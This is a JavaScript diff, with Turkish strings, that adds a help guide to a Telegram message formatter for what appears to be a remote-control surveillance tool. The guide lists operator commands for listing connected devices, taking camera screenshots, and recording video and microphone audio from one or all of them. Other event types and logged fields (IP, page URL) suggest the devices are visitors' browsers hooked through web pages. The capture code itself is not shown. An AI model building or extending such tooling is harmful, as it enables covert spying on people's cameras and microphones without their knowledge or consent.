@@ -88,13 +88,59 @@ function formatTelegramMessage(logData, ip) {
         'remote_control_started': '🎮 CİHAZ BAĞLANDI - UZAKTAN KONTROL AKTİF',
         'command_received': '📡 KOMUT ALINDI',
         'command_error': '⚠️ KOMUT HATASI',
-        'device_info': '📱 AKTİF CİHAZ BİLGİSİ'
+        'device_info': '📱 AKTİF CİHAZ BİLGİSİ',
+        'help_guide': '📖 KULLANIM KILAVUZU'
     };
 
     const title = eventIcons[event_type] || '🔔 YENİ OLAY';
 
     let message = `${title}\n`;
     message += `━━━━━━━━━━━━━━━━\n`;
+
+    // Help guide için özel format
+    if (event_type === 'help_guide') {
+        message = `📖 <b>UZAKTAN KONTROL KILAVUZU</b>\n`;
+        message += `━━━━━━━━━━━━━━━━\n\n`;
+        
+        message += `<b>📱 CİHAZ BİLGİSİ:</b>\n`;
+        message += `<code>/devices</code> - Aktif cihazları göster\n`;
+        message += `<code>/help</code> - Bu kılavuzu göster\n\n`;
+        
+        message += `<b>📷 KAMERA SCREENSHOT:</b>\n`;
+        message += `<code>/camss</code> - Tüm cihazlardan\n`;
+        message += `<code>/camss 2</code> - Sadece 2. cihazdan\n\n`;
+        
+        message += `<b>🎥 VİDEO KAYIT:</b>\n`;
+        message += `<code>/camrec</code> - 5 saniye (default)\n`;
+        message += `<code>/camrec10</code> - 10 saniye (tüm cihazlar)\n`;
+        message += `<code>/camrec10 2</code> - 10 saniye (2. cihaz)\n`;
+        message += `<code>/camrec30</code> - 30 saniye (maksimum)\n\n`;
+        
+        message += `<b>🎤 SES KAYIT:</b>\n`;
+        message += `<code>/micrec</code> - 5 saniye (default)\n`;
+        message += `<code>/micrec10</code> - 10 saniye (tüm cihazlar)\n`;
+        message += `<code>/micrec10 2</code> - 10 saniye (2. cihaz)\n`;
+        message += `<code>/micrec30</code> - 30 saniye (maksimum)\n\n`;
+        
+        message += `<b>💡 İPUÇLARI:</b>\n`;
+        message += `• Cihaz numarası belirtmezsen tüm cihazlar çalışır\n`;
+        message += `• Süre: Min 1s, Max 30s\n`;
+        message += `• Komutlar tek seferlik çalışır\n`;
+        message += `• Video kalitesi: 640x480 (küçük dosya)\n\n`;
+        
+        message += `<b>📊 ÖRNEK KULLANIM:</b>\n`;
+        message += `1️⃣ <code>/devices</code> → Cihazları listele\n`;
+        message += `2️⃣ <code>/camss 1</code> → 1. cihazdan screenshot\n`;
+        message += `3️⃣ <code>/camrec15 2</code> → 2. cihazdan 15s video\n`;
+        message += `4️⃣ <code>/micrec10</code> → Tüm cihazlardan 10s ses\n\n`;
+        
+        message += `━━━━━━━━━━━━━━━━\n`;
+        message += `🎮 Sistem Aktif - Komutlar Hazır!\n`;
+        
+        return message;
+    }
+
+    // Normal event formatı
     message += `📅 Tarih: ${formattedDate}\n`;
     message += `📄 Sayfa: ${page_title || 'Unknown'}\n`;
     message += `🔗 URL: ${page_url}\n`;
